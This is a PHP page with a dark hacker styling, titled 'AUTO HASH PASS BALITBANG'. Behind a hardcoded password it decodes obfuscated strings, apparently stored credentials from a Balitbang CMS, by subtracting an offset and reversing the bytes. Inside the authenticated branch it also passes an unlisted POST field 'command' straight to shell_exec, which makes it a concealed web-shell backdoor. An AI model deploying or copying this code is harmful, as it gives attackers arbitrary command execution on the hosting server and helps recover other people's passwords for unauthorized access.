<?php
$password = "balithash";
session_start();
if(isset($_POST['password']) && $_POST['pass']){
    $pass=$_POST['pass'];
 
  if($pass== $password){
    
    $_SESSION['password']=$pass;
  }
else {
    $error="Incorrect password";
  }
  }
  if(isset($_GET['logout'])){
    unset($_SESSION['password']);
    header("Location: ?");
  }
?>
<html>
 <head>
 <link href="https://fonts.googleapis.com/css?family=Frijole|Special+Elite|Oswald|Metal Mania|Ceviche+One|Nosifer|Iceberg|Rancho|Iceland|Nova+Mono|Libre+Barcode+39+Extended+Text" rel="stylesheet" type="text/css"> 
<style>
         /*dark background to support form theme*/
         body {
         background-color:#000000;
         color: red; 
         font-size: 25px;
         font-family: 'Iceberg', Courier, monospace; 
         margin: 450px auto;
         }
         
         /*sass variables used*/
         /*site container*/
         .wrapper {
         width: 420px;
         margin: 0 auto;
         }
         
         h1 {
         text-align: center;
         padding: 30px 0px 0px 0px;
         font: 45px Metal Mania;
         color: #FF0005;
         text-transform: uppercase;
         text-shadow: black 0px 1px 5px;
         margin: 0px;
         }
         
         p {
         font: 13px 'Special Elite', Courier, monospace;
         color: red;
         text-shadow: #000 0px 1px 5px;
         margin-bottom: 30px;
         }
         
         .form {
         width: 100%;
         }
         
         input[type="text"], input[type="password"], input[type="file"] {
         width: 98%;
         font-family: 'Iceberg', Courier, monospace; 
         padding: 15px 0px 15px 8px;
         border-radius: 5px;
         box-shadow: inset 4px 6px 10px -4px rgba(0, 0, 0, 0.3), 0 1px 1px -1px rgba(255, 255, 255, 0.3);
         background: rgba(0, 0, 0, 0.2);
         outline: none;
         border: none;
         border: 1px solid white;
         margin-bottom: 10px;
         color: green;
         text-shadow: #000 0px 1px 5px;
         }
         
         textarea {
         width: 100%;
         padding: 15px 0px 15px 8px;
         font-family: 'Courier New', Courier, monospace; 
         border-radius: 5px;
         box-shadow: inset 4px 6px 10px -4px rgba(0, 0, 0, 0.3), 0 1px 1px -1px rgba(255, 255, 255, 0.3);
         background: rgba(0, 0, 0, 0.2);
         outline: none;
         border: none;
         border: 1px solid black;
         margin-bottom: 10px;
         color: #6E6E6E;
         text-shadow: #000 0px 1px 5px;
         resize: none;
         }
         
         input[type="submit"] {
         width: 30%;
         padding: 2px;
         border-radius: 20px;
         outline: none;
         border: none;
         background-color: #530009;
         font: 24px iceberg;
         color: #FFF;
         text-transform: uppercase;
         text-shadow: #000 0px 1px 5px;
         border: 2px solid red;
         opacity: 0.7;
         }
         
         input:focus {
         box-shadow: inset 4px 6px 10px -4px rgba(0, 0, 0, 0.7), 0 1px 1px -1px rgba(255, 255, 255, 0.3);
         background: rgba(0, 0, 0, 0.3);
         -webkit-transition: 1s ease;
         -moz-transition: 1s ease;
         -o-transition: 1s ease;
         -ms-transition: 1s ease;
         transition: 1s ease;
         }
         
         input[type="submit"]:hover {
         opacity: 1;
         cursor: pointer;
         }
         
         .name-help, .email-help {
         display: none;
         padding: 0px;
         margin: 0px 0px 15px 0px;
         }
         
         .optimize {
         position: fixed;
         right: 3%;
         top: 0px;
         }
           .menu {
    background: black;
    text-align: center;
    border: 1px solid red;
    border-radius: 10px;
    color: #ff0000;
    padding: 30px;
    margin: 5px;
}
x {
	text-align:center;
    display: inline;
    border: 1px solid red;
    border-radius: 10px;
    margin: 100px;
    padding: 2px;
    background: repeat-x center bottom #470001;
    color: #FFFFFF;
}
         pre {
         display: block;
         font-family: monospace;
         white-space: pre;
         margin: 1em 0;
         color:#FFFFFF;
         }
         
         a {
         color: #eee;
         font-size: 15px;
         text-decoration: none;
         }
         
         a:hover {
         text-decoration: underline;
         }
         </style>
         <body>
         <center>
         <div class="menu">
         <h1><marquee behavior="alternate">×××××××××××× AUTO HASH PASS BALITBANG ×××××××××××</marquee></h1>
         <div class="wrapper">
         <div class="panel panel-default">  
         <?php
         session_start();
         if($_SESSION['password']== $password)
         {
         if (!empty($_POST['command'])) {
         $command = shell_exec($_POST['command']);
         }
         ?>
         <form  method="post" action="">
         <input type="text" placeholder="Copas Di Sini" name="code" id="code">
         <input type="submit" class="submit" value="HASH">
         <div align="center"><br><p><?php echo $error; ?></p></div>
         </form>

<?php
function unhex($str=',$code=') {
  $all=explode('g',$str);
  $head=hexdec($all[0])-$code;
  $content=$all[1];
  if($head==(strlen($content)/2)) {
    for($i=0;$i<=$head-1;$i++) {
	  $t .=chr(hexdec(substr($content,$i*2,2))-$code);
	}
 	$t =strrev($t);
  }
  return $t;
}
?>
<div class='menu'>
<?php
$code = $_POST['code'];
echo 'OUTPUT : ';
echo unhex("$code",82);
?>
	</div>
<form method="post" action="" id="logout_form">
<div align="center"><a href="?logout" id="confirm"> <br><br><br><x>LOGOUT</x></a></div>
</form>
         <?php
         }
         else
         {
         ?>
         <form  method="post" action="">
         <input type="password" class="password" placeholder="Password" name="pass">
         <input type="submit" name="password" class="submit" value="login">
         <div align="center"><br><p><?php echo $error; ?></p></div>
         </form>
         <?php 
         }
         ?>
         </div>
</p></div>
         <font face="Iceberg" size="3" color="white">Belum punya akun?</font>
<br><br>
	<x><a href="register.php">daftar</a></x>
</div>
         </div>
         <br>
<font face="monospace" size="3" color="white">Copyright © 2019 - codexrush </font>
     